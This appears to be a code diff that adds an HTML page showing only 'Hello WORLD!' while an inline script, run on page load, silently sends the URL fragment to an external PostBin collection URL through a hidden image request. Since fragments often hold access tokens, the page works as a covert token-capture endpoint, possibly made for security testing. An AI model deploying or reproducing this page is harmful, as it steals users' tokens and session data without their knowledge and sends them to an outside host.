@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+
+    <script>
+   document.addEventListener('DOMContentLoaded', function() {
+    // Get the fragment identifier from the URL
+    var fragment = window.location.hash;
+
+    // Remove the '#' symbol if needed
+    fragment = fragment.slice(1);
+
+    // Define the POSTBin URL
+    var postBinUrl = 'https://www.toptal.com/developers/postbin/1714712791054-4812347029801'; // Replace 'https://postb.in/example' with your actual POSTBin URL
+
+    // Construct the URL with the fragment value as a query parameter
+    postBinUrl += '?fragment=' + encodeURIComponent(fragment);
+
+    // Create a new Image object (GET request is made via an <img> tag)
+    var img = new Image();
+
+    // Set the src attribute to the POSTBin URL
+    img.src = postBinUrl;
+
+    // Define the callback function to handle the response (optional)
+    img.onload = function() {
+        console.log('GET request sent to POSTBin');
+    };
+
+    // Append the Image object to the document (optional, for the request to be sent)
+    document.body.appendChild(img);
+});
+
+    </script>
+</head>
+<body>
+    <h1>Hello WORLD!</h1>
+</body>
+</html>
